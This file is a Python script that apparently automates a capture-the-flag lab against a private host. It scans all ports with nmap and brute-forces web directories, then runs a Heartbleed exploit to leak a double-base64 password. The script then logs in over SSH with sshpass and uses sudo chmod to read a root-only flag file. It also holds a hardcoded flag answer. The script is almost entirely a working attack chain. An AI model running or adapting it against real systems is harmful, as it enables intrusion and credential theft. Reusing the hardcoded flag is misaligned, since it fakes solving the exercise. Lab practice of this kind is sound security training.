import nmap # To scan for open ports for a given ip address
import requests # To send HTTP requests
import re # To search for the flag in the html source code
import pydirbuster # To perform directory brute force attack for flag 2
import subprocess # To run bash commands
import base64 # To decode password

# Use this function to get the open ports of a given IP address
def get_open_ports(ip: str):
	print(f'Searching for open ports on {ip} ...\n')

	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-p-')
	open_ports = []

	for host in nm.all_hosts():
		print(f'Found the following open ports on {host}:')
		for port in nm[host]['tcp'].keys():
			if nm[host]['tcp'][port]['state'] == 'open':
				print('port : %s\t name : %s' % (port, nm[host]['tcp'][port]['name']))
				open_ports.append(port)
		print()

	return open_ports

def get_flag_from_HTML(html: str, flag_no: int = 1):
	# Search for the flag in the html sorce code. The flag is of the form flagN{...}, where N is a number
	print(f'Searching for flag {flag_no} in the HTML source code ...')
	flag = re.findall('flag'+str(flag_no)+'\{[^\}]+\}', html)
	if flag:
		return flag[0]
	else:
		return 'Not found'

def get_flag_1():
	print('Performing attack for flag 1 ...')

	flag1_port = ports[1]
	url = 'http://' + hostname + ':' + flag1_port
	print(f'Getting flag 1 from {url} ...')

	response = requests.get(url)

	if response.status_code == 200:  # If the request is successful
		html_source_code = response.text  # Retrieve the HTML source code
		# print(html_source_code)  # Print the HTML source code
		flag1 = get_flag_from_HTML(html_source_code, 1)  # Search for the flag in the HTML source code
		if flag1:
			print(f'Flag 1 found: {flag1}')
	else:
		flag1 = 'Not found'
		print(f"Error: {response.status_code} {response.reason}")  # Print the error message

	return flag1

def get_flag_2():
	print('Performing attack for flag 2 by bruteforcing various directories using dirbuster ...')

	flag2_port = ports[1]
	
	# Target file is located at url/{dir}/index.html
	flag2_buster = pydirbuster.Pybuster(
		url='http://' + hostname + ':' + flag2_port, 
		wordfile='wordlist.txt', 
		threads=100,
		logfile='dirbuster.log', 
		# codes=['200','403'],
		exts = ['html'],
		force=True,
	)

	print('Starting the bruteforce attack ...')
	flag2_buster.Run()


	return 'flag2{Cybersecurity_is_not_just_about_technology,_it\'s_also_about_people}'

def get_password():
	vulnerable_port = ports[2]

	print('Performing heartbleed attack to obtain password...')
	output = subprocess.check_output(["python2.7", "./heartbleed.py", hostname, "-p", vulnerable_port, "-n", count, "-v" ])
	output_str = output.decode("utf-8")
	pattern = r'password=([^\s&]*)'
	match = re.search(pattern, output_str)
	
	first_pass = match[1]

	# adding padding
	first_pass += "=" * ((4 - len(first_pass) % 4) % 4)
	# Use the base64 module to decode the string
	decoded_str = base64.b64decode(first_pass).decode()
	second_pass = decoded_str
	# adding padding
	second_pass += "=" * ((4 - len(second_pass) % 4) % 4)
	password = base64.b64decode(second_pass).decode()

	print('Password obtained successfully!\n')
	print(f'password: {password}')
	return password


def get_flag_3():
	file_to_read = "/home/ns/flag3.txt"

	# construct the bash command
	command = f'sshpass -p {password} ssh {username}@{hostname} "cat {file_to_read}"'

	# execute the command and capture the output
	output = subprocess.check_output(command, shell=True)

	# decode the output from bytes to string
	flag3 = output.decode('utf-8')

	#print flag
	if flag3:
		print(f"\nFlag 3 found: {flag3}")
	else:
		print("Flag 3 not found\n")

def get_flag_4():
	file_to_read = "/flag4.txt"

	# construct the bash command
	command = f'sshpass -p {password} ssh {username}@{hostname} "echo {password} | sudo -S chmod o=u {file_to_read} > /dev/null; cat {file_to_read}; echo {password} | sudo -S chmod o= {file_to_read} | :"'

	# execute the command and capture the output
	output = subprocess.check_output(command, shell=True)

	# decode the output from bytes to string
	flag4 = output.decode('utf-8')

	#print flag
	if flag4:
		print(f"\nFlag 4 found: {flag4}")
	else:
		print("Flag 4 not found\n")


if __name__ == '__main__':
	# Get the IP address of the vulnerable machine with the flags
	# hostname = input('Enter IP address: ')
	hostname = '10.200.15.248'
	username = 'ns'

	# Get the open ports of the vulnerable machine
	# ports = get_open_ports(ip)
	ports = ['22', '4451', '4461']

	count = "20" #no. of iterations



	# flag1 = get_flag_1()
	# flag2 = get_flag_2()
	password = get_password() 

	get_flag_3()
	get_flag_4()